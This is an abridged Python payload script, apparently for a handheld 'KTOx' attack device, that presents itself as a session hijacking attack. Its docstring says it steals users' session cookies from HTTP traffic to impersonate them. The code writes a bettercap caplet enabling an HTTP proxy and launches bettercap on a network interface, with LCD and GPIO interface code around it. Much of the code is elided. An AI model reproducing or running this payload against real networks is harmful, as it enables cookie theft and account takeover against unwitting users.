#!/usr/bin/env python3
"""
KTOx *payload* – **Session Hijacking Attack**
==================================================
This payload performs a Session Hijacking attack by stealing a user's
session cookie and using it to impersonate the user.

Features:
- Uses bettercap to perform the attack.
- Steals session cookies from HTTP traffic.
...
def draw_ui(screen_state="main", message_lines=None):
    ...
    d.text((5, 5), "Session Hijacking", font=FONT_TITLE, fill=(30, 132, 73))
    ...
    if message_lines:
        ...
        d.text((5, 110), "KEY1=Iface", font=FONT, fill=(171, 178, 185))
...
http.proxy on
"""
    with open("/tmp/session_hijacking.cap", "w") as f:
        f.write(caplet)
        
    # Start the attack
    subprocess.Popen(f"bettercap -iface {INTERFACE} -caplet /tmp/session_hijacking.cap", shell=True)
...
if __name__ == "__main__":
    try:
        ...
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Session Hijacking Attack payload finished.")
